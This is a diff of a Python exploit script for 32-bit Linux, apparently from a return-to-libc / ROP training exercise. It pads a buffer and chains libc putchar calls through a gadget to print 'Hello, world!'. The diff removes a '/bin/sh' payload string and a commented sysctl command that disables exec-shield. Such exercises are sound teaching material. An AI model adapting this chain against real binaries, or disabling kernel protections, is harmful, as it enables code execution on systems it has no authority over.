@@ -18,7 +18,7 @@ context(arch='i386', os='linux')
 # Addresses have been currently censored, figure out yourself!
 
 # NOTE this might vary based on machine
-libc_entry = 0xf7dd1000
+libc_entry = 0xf7dcf000
 
 # NOTE that you might have different offsets, depending on libc version
 #  and compiler settings
@@ -28,20 +28,18 @@ offset_pr = 0x00165e1d  # pop ebx;ret
 offset_exit = 0x000303d0
 offset_putchar = 0x00069920
 
-# Disable ASCII ARMOR
-# sysctl -w kernel.exec-shield=0
 
 
 def main():
-    payload = "/bin/sh"
+    # payload = ""
     padChar2 = "\x90"
-    padSize = 25
+    padSize = 32
     # Initial payload
 
     hello = "\nHello, world!\n\n"  # We are using putchar function from libc
     # as example to chain multiple function calls/gadgets
     # For each character in our phrase, there is putchar call
-    payload += padChar2 * padSize
+    payload = padChar2 * padSize
     for char in hello:  # Generate payload for printing 'Hello, world!'
         # payload += p32(libc_entry + offset_putchar)  # function p32 changes
         payload += p32(libc_entry + offset_putchar)
